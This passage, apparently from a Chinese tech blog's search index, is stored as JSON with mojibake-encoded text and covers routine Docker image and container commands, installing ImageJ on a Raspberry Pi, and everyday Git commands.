2;done"1a3941b6ae8e# æ˜¾ç¤ºå½“å‰æ­£åœ¨è¿è¡Œçš„å®¹å™¨ï¼Œå‘ç°åˆšæ‰ä»¥åå°æ–¹å¼å¯åŠ¨çš„å®¹å™¨ä¸ä¼šå†è‡ªåŠ¨åœæ­¢# docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES1a3941b6ae8e centos "/bin/sh -c \'while tâ€¦" 11 minutes ago Up 11 minutes infallible_haslett# è·Ÿè¸ªæ˜¾ç¤ºIDä¸º1a3941b6ae8eçš„å®¹å™¨çš„å†…éƒ¨æ—¥å¿—ä¿¡æ¯# docker logs -f -t --tail 5 1a3941b6ae8e2018-12-24T19:06:07.180718501Z hello docker2018-12-24T19:06:09.185193606Z hello docker2018-12-24T19:06:11.189919184Z hello docker2018-12-24T19:06:13.193004892Z hello docker2018-12-24T19:06:15.196940992Z hello docker Docker å¸¸ç”¨å‘½ä»¤å›¾è§£ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å®¹å™¨åŒ–"},{title:"Docker ä¹‹äºŒ Docker é•œåƒç®¡ç†å‘½ä»¤",url:"/posts/77134a0f.html",text:'Docker å¸®åŠ©å‘½ä»¤123456789101112# æŸ¥çœ‹Dockerçš„ç‰ˆæœ¬# docker version# æŸ¥çœ‹Dockerçš„è¯¦ç»†ä¿¡æ¯# docker info# æŸ¥çœ‹Dockerçš„å‘½ä»¤å¸®åŠ©æ‰‹å†Œ# docker --help# æŸ¥çœ‹Dockerå…·ä½“æŸä¸ªæ“ä½œçš„å‘½ä»¤å¸®åŠ©æ‰‹å†Œ# docker images --help# docker search --help Docker é•œåƒæŸ¥çœ‹å‘½ä»¤1234567891011121314# è¯­æ³•# docker images [OPTIONS] [REPOSITORY[:TAG]]# æŸ¥çœ‹æœ¬åœ°æ‰€æœ‰é•œåƒçš„åˆ—è¡¨# docker images# æŸ¥çœ‹æœ¬åœ°æŸä¸ªé•œåƒçš„ä¿¡æ¯# docker images centos# å‚æ•°OPTIONS# -aï¼šåˆ—å‡ºæœ¬åœ°æ‰€æœ‰çš„é•œåƒï¼ˆå«ä¸­é—´æ˜ åƒå±‚ï¼‰# -qï¼šåªæ˜¾ç¤ºæœ¬åœ°æ‰€æœ‰é•œåƒçš„é•œåƒID# --no-truncï¼šä¸æˆªæ–­è¾“å‡º# --digestsï¼šæ˜¾ç¤ºé•œåƒçš„æ‘˜è¦ä¿¡æ¯ Docker é•œåƒæœç´¢å‘½ä»¤12345678910111213# è¯­æ³•# docker search [OPTIONS] TERM# æœç´¢Docker-Hubä¸­çš„é•œåƒ# docker search tomcat# å‚æ•°OPTIONS# --no-truncï¼šä¸æˆªæ–­è¾“å‡º# --limitï¼šé™åˆ¶æœç´¢ç»“æœçš„æ¡ç›®æ•°é‡ï¼Œé»˜è®¤å€¼æ˜¯25ï¼Œä¾‹å¦‚â€œ--limit 15â€# --filterï¼šåŠ ä¸Šè¿‡æ»¤æ¡ä»¶è¿›è¡Œæœç´¢# --filter=stars=3ï¼šåˆ—å‡ºç‚¹èµæ•°ä¸å°äºæŒ‡å®šå€¼çš„é•œåƒ# --filter "is-official=true"ï¼š åªåˆ—å‡ºDockerå®˜æ–¹å‘å¸ƒçš„é•œåƒ# --filter "is-automated=true"ï¼š åªåˆ—å‡ºautomated buildç±»å‹çš„é•œåƒ Docker é•œåƒä¸‹è½½å‘½ä»¤123456789101112# è¯­æ³•# docker pull [OPTIONS] NAME[:TAG|@DIGEST]# ä¸‹è½½Tomcaté•œåƒï¼Œé»˜è®¤ä¸‹è½½latestç‰ˆæœ¬# docker pull tomcat# ä¸‹è½½æŒ‡å®šç‰ˆæœ¬çš„Tomcaté•œåƒ# docker pull tomcat:8.0# å‚æ•°OPTIONS# -aï¼šæ‹‰å–æ‰€æœ‰taggedé•œåƒ# --disable-content-trustï¼šå¿½ç•¥é•œåƒçš„æ ¡éªŒï¼Œé»˜è®¤å¼€å¯ Docker é•œåƒåˆ é™¤å‘½ä»¤123456789101112131415161718192021# è¯­æ³•# docker rmi [OPTIONS] IMAGE [IMAGE...]# åˆ é™¤æŒ‡å®šçš„é•œåƒï¼Œé»˜è®¤åˆ é™¤latestç‰ˆæœ¬# docker rmi hello-world# å¼ºåˆ¶åˆ é™¤æŒ‡å®šçš„é•œåƒï¼Œé»˜è®¤åˆ é™¤latestç‰ˆæœ¬# docker rmi -f hello-world# æ ¹æ®é•œåƒIDåˆ é™¤é•œåƒ# docker rmi 4ab4c602aa5e# åˆ é™¤å¤šä¸ªé•œåƒï¼Œé»˜è®¤åˆ é™¤latestç‰ˆæœ¬# docker rmi tomcat nginx# åˆ é™¤æœ¬åœ°æ‰€æœ‰é•œåƒ# docker rmi $(docker images -qa)# å‚æ•°OPTIONS# -fï¼šå¼ºåˆ¶åˆ é™¤ï¼Œå³ä½¿é•œåƒå¯¹åº”çš„å®¹å™¨å®ä¾‹æ­£åœ¨è¿è¡Œ# --no-pruneï¼šä¸ç§»é™¤è¯¥é•œåƒçš„è¿‡ç¨‹é•œåƒï¼Œé»˜è®¤ç§»é™¤ æ‰¹é‡åˆ é™¤é•œåƒ12# æ¸…ç†æ‰€æœ‰ä¸è¢«ä½¿ç”¨çš„é•œåƒï¼Œæ­£åœ¨ä½¿ç”¨çš„é•œåƒå’Œå®¹å™¨ä¸ä¼šè¢«åˆ é™¤ï¼Œä½†æ˜¯è¿™ä¸ªå‘½ä»¤åˆ‡å¿Œæ…ç”¨ï¼Œå› ä¸ºå®ƒæŠŠæ•´ä¸ªdockerç©ºé—´éƒ½é‡Šæ”¾æ‰ï¼Œå³æ‰€æœ‰ä¸è¢«æ­£åœ¨ä½¿ç”¨çš„é•œåƒå’Œå®¹å™¨éƒ½ä¼šè¢«åˆ é™¤# docker system prune -a æ„å»º Docker é•œåƒ12# æ ¹æ®æŒ‡å®šçš„Dockerfileæ„å»ºæ–°çš„é•œåƒï¼Œpeter/centosæ˜¯æ–°é•œåƒçš„åç§°ï¼Œ1.1æ˜¯tagï¼ˆç‰ˆæœ¬å·ï¼‰# docker build -f ~/dockerfile-centos -t peter/centos:1.1 . Docker å‘½ä»¤å¸®åŠ©æ‰‹å†Œæ¨èèœé¸Ÿæ•™ç¨‹ - Docker å‘½ä»¤å¤§å…¨ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å®¹å™¨åŒ–"},{title:"åŸºäºæ ‘è“æ´¾å®‰è£… ImageJ",url:"/posts/67ba58dd.html",text:'ImageJ ä»‹ç» ä¸€ä¸ªåŸºäº Java çš„å…¬å…±çš„å›¾åƒå¤„ç†è½¯ä»¶ ImageJ Github Repo ImageJ WiKi ImageJ å®‰è£…1234567891011121314151617181920212223242526272829# ç¡¬ä»¶ï¼š Raspberry 3B# ç³»ç»Ÿï¼š Raspbian-Stretchï¼ˆåŸºäºDebian-Stretchï¼‰# æ›´æ–°ç³»ç»Ÿï¼ˆå¯çœç•¥ï¼‰# apt-get update# apt-get upgrade# apt-get clean# æŸ¥çœ‹å½“å‰JDKçš„ç‰ˆæœ¬å·ï¼ˆå®˜æ–¹æœ€æ–°çš„Raspbianç³»ç»Ÿé»˜è®¤å·²å®‰è£…Open-JDK8ï¼‰# java -version# ä¸‹è½½Fiji-nojreï¼Œå¹¶è§£å‹# cd /home/pi/Downloads# wget http://downloads.imagej.net/fiji/latest/fiji-nojre.zip# unzip fiji-nojre.zip# ä¸‹è½½ImageJè„šæœ¬ï¼Œå¹¶æˆæƒæ‰§è¡Œ# cd /home/pi/Downloads# git clone https://github.com/imagej/imagej.git# cd /home/pi/Downloads/imagej/bin# chmod +x ImageJ.sh# æ‹·è´Fijiçš„JaråŒ…åˆ°ImageJç›®å½•ä¸‹# cd /home/pi/Downloads# cp -r Fiji.app/jars imagej/# è¿è¡ŒImageJ# cd /home/pi/Downloads/imagej/bin# ./ImageJ.sh å‚è€ƒæ–‡çŒ® https://imagej.net/Raspberry_Pi https://imagej.net/Fiji/Downloads#Installation https://imagej.nih.gov/ij/docs/install/linux.html https://groups.google.com/forum/#!topic/fiji-devel/eIF82i4shC0 http://forum.imagej.net/t/how-to-run-fiji-at-raspberry-pi-3/4743/11 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"æ ‘è“æ´¾"},{title:"äº’è”ç½‘æ—¶ä»£ä¸‹çš„æ¶æ„æ®¿å ‚ä¹‹è·¯",url:"/posts/a570a16.html",text:'æ¶æ„æ€ç»´ï¼šäº’è”ç½‘æ¶æ„å‡çº§æ¼”è¿› æ¶æ„è¿›é˜¶ï¼šäº’è”ç½‘æ¶æ„ä¹‹å‡çº§æ”¹é€  æ¶æ„çªç ´ï¼šé«˜å¯ç”¨å¼¹æ€§ä¼¸ç¼©çš„äº‘æ¶æ„ä¹‹è¿ç§»æ”¹é€  æ¶æ„æ®¿å ‚ï¼šé«˜å¯ç”¨å¼¹æ€§ä¼¸ç¼©çš„äº‘æ¶æ„ä¹‹é«˜å¹¶å‘å®æˆ˜ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"çŸ¥è¯†å›¾è°±"},{title:"Git ä¹‹ä¸€ Git å¸¸ç”¨å‘½ä»¤",url:"/posts/e3228f73.html",text:'Git çš„å››ä¸ªå·¥ä½œåŒºåŸŸ Git åˆå§‹åŒ–æœ¬ä»“åº“123456789101112131415161718192021222324252627282930313233# åˆ›å»ºæœ¬åœ°æµ‹è¯•åº“çš„ç›®å½•$ mkdir test_repo$ cd test_repo# åˆå§‹åŒ–æœ¬åœ°åº“$ git init# åˆå§‹åŒ–åçš„ç›®å½•ç»“æ„$ tree -al ../test_repotest_repo/â””â”€â”€ .git â”œâ”€â”€ branches â”œâ”€â”€ config â”œâ”€â”€ description â”œâ”€â”€ HEAD â”œâ”€â”€ hooks â”‚&nbsp;&nbsp; â”œâ”€â”€ applypatch-msg.sample â”‚&nbsp;&nbsp; â”œâ”€â”€ commit-msg.sample â”‚&nbsp;&nbsp; â”œâ”€â”€ post-update.sample â”‚&nbsp;&nbsp; â”œâ”€â”€ pre-applypatch.sample â”‚&nbsp;&nbsp; â”œâ”€â”€ pre-commit.sample â”‚&nbsp;&nbsp; â”œâ”€â”€ prepare-commit-msg.sample â”‚&nbsp;&nbsp; â”œâ”€â”€ pre-push.sample â”‚&nbsp;&nbsp; â”œâ”€â”€ pre-rebase.sample â”‚&nbsp;&nbsp; â””â”€â”€ update.sample â”œâ”€â”€ info â”‚&nbsp;&nbsp; â””â”€â”€ exclude â”œâ”€â”€ objects â”‚&nbsp;&nbsp; â”œâ”€â”€ info â”‚&nbsp;&nbsp; â””â”€â”€ pack â””â”€â”€ refs â”œâ”€â”€ heads â””â”€â”€ tags Git é…ç½®ç­¾åï¼ˆæœ¬åœ°åº“ï¼‰è¿™é‡Œçš„ç­¾åä»…ä»…æ˜¯ä¸ºäº†æ–¹ä¾¿æ ‡è¯†æäº¤ä»£ç çš„ä½œè€…èº«ä»½ï¼Œå¹¶ä¸ç”¨äº Git è¿œç¨‹åº“ï¼ˆGithubï¼‰çš„èº«ä»½è®¤è¯ï¼ˆä¾‹å¦‚ Github ç™»å½•ï¼‰ å±€éƒ¨ 12345678910111213141516171819202122$ cd git_test# æŸ¥çœ‹å‘½ä»¤å¸®åŠ©æ‰‹å†Œ$ git config --help# é…ç½®ä»“åº“çº§åˆ«ç­¾åï¼Œä»…åœ¨å½“å‰æœ¬åœ°åº“èŒƒå›´å†…æœ‰æ•ˆ$ git config user.name peter$ git config user.email peter@gmail.com# ä»“åº“çº§åˆ«ç­¾åé…ç½®ä¿¡æ¯çš„ä¿å­˜ä½ç½®$ cat .git/config[user] name = peter email = peter@gmail.com# æŸ¥çœ‹å½“å‰ä»“åº“çº§åˆ«ç­¾å$ git config --get user.name$ git config --get user.email# é‡ç½®å½“å‰ä»“åº“çº§åˆ«ç­¾å$ git config --unset user.name$ git config --unset user.email å…¨å±€ 12345678910111213141516171819202122# é…ç½®ç³»ç»Ÿç”¨æˆ·çº§åˆ«ç­¾åï¼ˆå…¨å±€æœ‰æ•ˆï¼‰$ git config --global user.name peter_glb$ git config --global user.email peter@gmail.com# ç³»ç»Ÿç”¨æˆ·çº§åˆ«ç­¾åé…ç½®ä¿¡æ¯çš„ä¿å­˜ä½ç½®$ cat ~/.gitconfig[user] name = peter_glb email = peter@gmail.com# æŸ¥çœ‹ç³»ç»Ÿç”¨æˆ·çº§åˆ«ç­¾å$ git config --global --get user.name$ git config --global --get user.email# é‡ç½®ç³»ç»Ÿç”¨æˆ·çº§åˆ«ç­¾å$ git config --global --unset user.name$ git config --global --unset user.email# ç­¾åçº§åˆ«ä¼˜å…ˆçº§è¯´æ˜# å°±è¿‘åŸåˆ™ï¼Œä»“åº“çº§åˆ«ç­¾åä¼˜å…ˆäºç³»ç»Ÿç”¨æˆ·çº§åˆ«ç­¾åï¼ŒäºŒè€…éƒ½æœ‰æ—¶é‡‡ç”¨ä»“åº“çº§åˆ«ç­¾å# å¦‚æœåªå­˜åœ¨ç³»ç»Ÿç”¨æˆ·çº§åˆ«ç­¾åï¼Œåˆ™ä»¥ç³»ç»Ÿç”¨æˆ·çº§åˆ«ç­¾åä¸ºå‡†# äºŒè€…ä¸å…è®¸åŒæ—¶ä¸ºç©º Git æ“ä½œæ–°å»ºçš„æ–‡ä»¶ï¼ˆæœ¬åœ°åº“ï¼‰1234567891011121314151617# æ˜¾ç¤ºå·¥ä½œåŒºå’Œæš‚å­˜åŒºçš„çŠ¶æ€$ git status# æ·»åŠ æ–°æ–‡ä»¶åˆ°æš‚å­˜åŒºï¼Œå»ºç«‹æ–‡ä»¶è·Ÿè¸ª$ git add api.json# å°†æ–°æ–‡ä»¶ä»æš‚å­˜åŒºæ’¤å‡ºï¼Œå–æ¶ˆæ–‡ä»¶è·Ÿè¸ª$ git rm --cached api.json# æ‰¹é‡å°†æ–°æ–‡ä»¶æ·»åŠ åˆ°æš‚å­˜åŒº$ git add --all# å°†æ–°æ–‡ä»¶ä»æš‚å­˜åŒºæäº¤åˆ°æœ¬åœ°åº“ï¼Œå¹¶æŒ‡å®šæäº¤çš„å¤‡æ³¨ä¿¡æ¯$ git commit api.json -m \'create message\'# æˆ–è€…æ‰¹é‡å°†æ–°æ–‡ä»¶ä»æš‚å­˜åŒºæäº¤åˆ°æœ¬åœ°åº“ï¼Œå¹¶æŒ‡å®šæäº¤çš„å¤‡æ³¨ä¿¡æ¯$ git commit -am "create message" Git æ“ä½œä¿®æ”¹è¿‡çš„æ–‡ä»¶ï¼ˆæœ¬åœ°åº“ï¼‰12345678910111213141516171819# å°†å·²æäº¤åˆ°æœ¬åœ°åº“ï¼Œä¸”åœ¨æœ¬åœ°ä¿®æ”¹è¿‡çš„æ–‡ä»¶ï¼ˆæœªæäº¤åˆ°æš‚å­˜åŒºï¼‰ï¼Œç›´æ¥ä¸¢å¼ƒå·¥ä½œåŒºçš„æ”¹åŠ¨è¿˜åŸä¸ºä¿®æ”¹å‰çš„å†…å®¹$ git checkout -- api.json# å°†å·²æäº¤åˆ°æœ¬åœ°åº“ï¼Œä¸”åœ¨æœ¬åœ°ä¿®æ”¹è¿‡çš„æ–‡ä»¶å†æ¬¡æäº¤åˆ°æš‚å­˜åŒº# è¿™é‡Œå¯ä»¥æ‰§è¡Œâ€œgit commitâ€ç›´æ¥æäº¤åˆ°æœ¬åœ°åº“ï¼Œçœç•¥"git add"æ“ä½œï¼Œä½†è¿™æ ·å°±ä¸èƒ½ä»æš‚å­˜åŒºæ’¤å›ä¿®æ”¹å‰çš„å†…å®¹$ git add api.json# å°†å·²æäº¤åˆ°æœ¬åœ°åº“ï¼Œä¸”åœ¨æœ¬åœ°ä¿®æ”¹è¿‡ä¸æäº¤åˆ°æš‚å­˜åŒºçš„æ–‡ä»¶ï¼Œä»æš‚å­˜åŒºæ’¤å‡º$ git reset HEAD api.json# æ‰¹é‡å°†å·²æäº¤åˆ°æœ¬åœ°åº“ï¼Œä¸”åœ¨æœ¬åœ°ä¿®æ”¹è¿‡çš„æ–‡ä»¶å†æ¬¡æäº¤åˆ°æš‚å­˜åŒº# è¿™é‡Œå¯ä»¥æ‰§è¡Œâ€œgit commitâ€ç›´æ¥æäº¤åˆ°æœ¬åœ°åº“ï¼Œçœç•¥"git add"æ“ä½œï¼Œä½†è¿™æ ·ä»¥åå°±ä¸èƒ½ä»æš‚å­˜åŒºæ¢å¤æ•°æ®ï¼Œå¼ºçƒˆä¸å»ºè®®ä½¿ç”¨$ git add --all# å°†å·²æäº¤åˆ°æœ¬åœ°åº“ï¼Œä¸”åœ¨æœ¬åœ°ä¿®æ”¹è¿‡ä¸æäº¤åˆ°æš‚å­˜åŒºçš„æ–‡ä»¶ï¼Œå†æ¬¡æäº¤åˆ°æœ¬åœ°åº“$ git commit api.json -m \'update message\'# æ‰¹é‡å°†å·²æäº¤åˆ°æœ¬åœ°åº“ï¼Œä¸”åœ¨æœ¬åœ°ä¿®æ”¹è¿‡ä¸æäº¤åˆ°æš‚å­˜åŒºçš„æ–‡ä»¶ï¼Œå†æ¬¡æäº¤åˆ°æœ¬åœ°åº“$ git commit -am "update message" Git å¿½ç•¥è¿½è¸ªå·²æäº¤è¿‡çš„æ–‡ä»¶ä¸æ–‡ä»¶å¤¹123456789101112131415# åˆ›å»º.gitignoreæ–‡ä»¶$ touch .gitignore# ç¼–è¾‘.gitignoreæ–‡ä»¶ï¼Œç„¶åæ·»åŠ éœ€è¦è¢«å¿½ç•¥æäº¤çš„æ–‡ä»¶æˆ–è€…æ–‡ä»¶å¤¹çš„è·¯å¾„$ vim .gitignore# .gitignoreåªèƒ½å¿½ç•¥é‚£äº›åŸæ¥æ²¡æœ‰è¢«è¿½è¸ªçš„æ–‡ä»¶ï¼Œå¦‚æœæŸäº›æ–‡ä»¶å·²ç»è¢«çº³å…¥äº†ç‰ˆæœ¬ç®¡ç†ä¸­ï¼ˆå³å·²ç»è¢«commitè¿‡ï¼‰ï¼Œé‚£ä¹ˆé€šè¿‡.gitignoreæ–‡ä»¶æ˜¯æ— æ³•å®ç°å¿½ç•¥æäº¤çš„# æ­¤æ—¶éœ€è¦å…ˆæŠŠæœ¬åœ°ç¼“å­˜åˆ é™¤ï¼ˆæ”¹å˜æˆæœªè¿½è¸ªçŠ¶æ€ï¼‰å†é‡æ–°æäº¤ï¼Œå¦‚æ–‡ä»¶æˆ–è€…æ–‡ä»¶å¤¹åˆ é™¤ä¸æ‰ï¼Œå¯ä»¥åŠ ä¸Š -f å‚æ•°å¼ºåˆ¶åˆ é™¤ï¼Œä½†æ˜¯ä¸€å®šè¦åŠ ä¸Š --cached è¡¨ç¤ºåªåˆ é™¤ç¼“å†²æ–‡ä»¶# è‹¥å¿½ç•¥æäº¤çš„æ˜¯æ–‡ä»¶å¤¹ï¼Œå¿…é¡»å¯ä»¥åŠ ä¸Š -r å‚æ•°ï¼Œè¡¨ç¤ºå¿½ç•¥æäº¤æ–‡ä»¶å¤¹ä¸‹çš„æ‰€æœ‰æ–‡ä»¶$ git rm --cached shop.cpp$ git rm -f --cached shop.cpp$ git rm -r -f --cached store/# æäº¤$ git add --all &amp;&amp; git commit -am \'Cancel tracking file\' Git è®¾ç½®ä»£ç†1234567891011121314151617# è®¾ç½®å½“å‰ä»“åº“çš„HTTPä»£ç†$ git config http.proxy http://192.168.1.122:1080# è®¾ç½®å…¨å±€çš„HTTPä»£ç†$ git config --global http.proxy 192.168.1.122:1080#è®¾ç½®å½“å‰ä»“åº“çš„Socks5ä»£ç†$ git config http.proxy socks5://192.168.1.122:1081#è®¾ç½®å…¨å±€çš„Socks5ä»£ç†$ git config --global http.proxy socks5://192.168.1.122:1081# å–æ¶ˆå½“å‰ä»“åº“çš„ä»£ç†$ git config --unset http.proxy# å–æ¶ˆå…¨å±€çš„ä»£ç†$ git config --global --unset http.proxy Git è®¾ç½®ç”¨æˆ·åã€é‚®ç®±1234567891011121314151617# æŸ¥çœ‹å½“å‰ä»“åº“çš„é…ç½®ä¿¡æ¯$ git config --list# æŸ¥çœ‹å…¨å±€çš„é…ç½®ä¿¡æ¯$ git config --list --global# è®¾ç½®å½“å‰ä»“åº“çš„ç”¨æˆ·åã€é‚®ç®±$ git config user.name clay$ git config user.email example@qq.com# è®¾ç½®å…¨å±€çš„ç”¨æˆ·åã€é‚®ç®±$ git config --global user.name clay$ git config --global user.email example@qq.com# å–æ¶ˆè®¾ç½®å…¨å±€çš„ç”¨æˆ·åã€é‚®ç®±$ git config --global --unset user.name$ git config --global --unset user.email Git æ›´æ”¹æœ€åä¸€æ¬¡æäº¤çš„ä¿¡æ¯12345678# æ›´æ”¹æœ€åä¸€æ¬¡æäº¤çš„å¤‡æ³¨ä¿¡æ¯$ git commit --amend# æ›´æ”¹æœ€åä¸€æ¬¡æäº¤çš„ç”¨æˆ·åï¼Œè¿™é‡Œç›¸å½“äºæŒ‡å®š "user.name"$ git commit --amend --author=clay# æ›´æ”¹æœ€åä¸€æ¬¡æäº¤çš„æ—¥æœŸï¼Œç¬¬ä¸€ä¸ªæ—¥æœŸæ˜¯æäº¤æ—¥æœŸï¼Œç¬¬äºŒä¸ªæ—¥æœŸæ˜¯ä½œè€…æ—¥æœŸ$ GIT_COMMITTER_DATE="2021-02-04T12:32:03" git commit --amend --date="2021-02-04T12:32:03" Git æ’¤é”€æäº¤å¹¶æ¸…é™¤ç—•è¿¹123456789101112# æ’¤é”€æœ€è¿‘å‰4æ¬¡çš„æäº¤ï¼Œå…¶ä¸­4è¡¨ç¤ºæ’¤é”€æœ€è¿‘å‰å‡ æ¬¡æäº¤$ git reset --hard HEAD~4# ä¹Ÿå¯ä»¥æŒ‡å®šcommit_idï¼Œè¡¨ç¤ºæ’¤é”€æŸæ¬¡æäº¤ï¼ˆ6ddd44eï¼‰ä¹‹å‰çš„æ‰€æœ‰æäº¤$ git reflog$ git reset --hard 6ddd44e# å¼ºåˆ¶æ›´æ–°è¿œç¨‹çš„æäº¤å†å²$ git push -f# æˆ–è€…å¼ºåˆ¶æ›´æ–°ç‰¹å®šåˆ†æ”¯çš„æäº¤å†å²$ git push origin master -f var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"ç‰ˆæœ¬æ§åˆ¶"},{title:"Docker ä¹‹ä¸€ Docker ä»‹ç»ä¸å®‰è£…",url:"/posts/57bca56f.html",text:'Docker ç›¸å…³ç«™ç‚¹ Docker Hub Docker Github Docker Official Docs EN Docker Official Docs CN Docker Official Website EN Docker Official Website CN Docker ç›¸å…³æŠ€æœ¯ Golang CI/CD Mesos Swarm Machine Compose Kubernetes Docker çš„ç›®æ ‡ Build and Ship any Application Anywhereï¼Œå³é€šè¿‡å¯¹åº”ç»„ä»¶çš„å°è£…ã€åˆ†å‘ã€éƒ¨ç½²ã€è¿è¡Œç­‰ç”Ÿå‘½å‘¨æœŸçš„ç®¡ç†ï¼Œä½¿ç”¨æˆ·çš„åº”ç”¨åŠå…¶è¿è¡Œç¯å¢ƒèƒ½å¤Ÿåšåˆ° â€œä¸€æ¬¡æ„å»ºï¼Œåˆ°å¤„è¿è¡Œâ€ï¼Œå®˜æ–¹å›¾è§£å¦‚ä¸‹ï¼š ä»€ä¹ˆæ˜¯å®¹å™¨ï¼Ÿ ä¸€ç§è™šæ‹ŸåŒ–æ–¹æ¡ˆ æ“ä½œç³»ç»Ÿçº§åˆ«çš„è™šæ‹ŸåŒ– åªèƒ½è¿è¡Œç›¸åŒæˆ–ç›¸ä¼¼å†…æ ¸çš„æ“ä½œç³»ç»Ÿ ä¾èµ–äº Linux å†…æ ¸ç‰¹æ€§ï¼šNamespace å’Œ Cgroupsï¼ˆControl Groupï¼‰ï¼Œå‰è€…ç”¨äºèµ„æºéš”ç¦»ï¼Œåè€…ç”¨äºèµ„æºé™åˆ¶ å®¹å™¨åªèƒ½ä½¿ç”¨å®¿ä¸»æœºçš„ kernelï¼Œå¹¶ä¸”ä¸èƒ½ä¿®æ”¹ï¼›å³æ‰€æœ‰å®¹å™¨éƒ½å…±ç”¨å®¿ä¸»æœºçš„ kernelï¼Œåœ¨å®¹å™¨ä¸­æ— æ³•å¯¹ kernel è¿›è¡Œå‡çº§ã€‚ Docker ä¸è™šæ‹Ÿæœºçš„åŒºåˆ« å‚è€ƒæ–‡ç« ï¼šDocker å®¹å™¨ä¸è™šæ‹Ÿæœºæœ‰ä»€ä¹ˆåŒºåˆ«ï¼ŒVM vs Docker çš„å›¾è§£å¦‚ä¸‹ï¼š Docker çš„ä¸‰è¦ç´ ä»‹ç» ä¸‰è¦ç´ ï¼šä»“åº“ã€é•œåƒã€å®¹å™¨ Docker æœ¬èº«æ˜¯ä¸€ä¸ªå®¹å™¨è¿è¡Œè½½ä½“æˆ–ç§°ä¹‹ä¸ºç®¡ç†å¼•æ“ï¼ŒåŸºäº C/S æ¨¡å¼ï¼Œå³å®¢æˆ·ç«¯ / å®ˆæŠ¤è¿›ç¨‹ Docker é•œåƒæ˜¯å±‚å çš„åªè¯»æ–‡ä»¶ç³»ç»Ÿï¼Œé•œåƒç”¨ä½œåˆ›å»º Docker å®¹å™¨ï¼Œä¸€ä¸ªé•œåƒå¯ä»¥åˆ›å»ºå¤šä¸ªå®¹å™¨ å®¹å™¨æ˜¯ç”¨é•œåƒåˆ›å»ºçš„è¿è¡Œå®ä¾‹ï¼Œè¿™é‡Œçš„é•œåƒç›¸å½“äº Java ä¸­çš„ç±»ï¼Œå®¹å™¨ç›¸å½“äºé€šè¿‡è¯¥ç±»åˆ›å»ºçš„å¯¹è±¡å®ä¾‹ ä»“åº“æ˜¯é›†ä¸­å­˜æ”¾é•œåƒæ–‡ä»¶çš„åœºæ‰€ï¼Œä»“åº“ï¼ˆRepositoryï¼‰å’Œä»“åº“æ³¨å†ŒæœåŠ¡å™¨ï¼ˆRegistryï¼‰æ˜¯æœ‰åŒºåˆ«çš„ï¼Œä»“åº“æ³¨å†ŒæœåŠ¡å™¨ä¸Šå¾€å¾€å­˜æ”¾ç€å¤šä¸ªä»“åº“ï¼Œæ¯ä¸ªä»“åº“ä¸­åˆåŒ…å«äº†å¤šä¸ªé•œåƒï¼Œæ¯ä¸ªé•œåƒæœ‰ä¸åŒçš„æ ‡ç­¾ï¼ˆTagï¼‰ ä»“åº“åˆ†ä¸ºå…¬å¼€ä»“åº“ï¼ˆPublicï¼‰å’Œç§æœ‰ä»“åº“ï¼ˆPrivateï¼‰ä¸¤ç§å½¢å¼ï¼Œæœ€å¤§çš„å…¬å¼€ä»“åº“æ˜¯ Docker 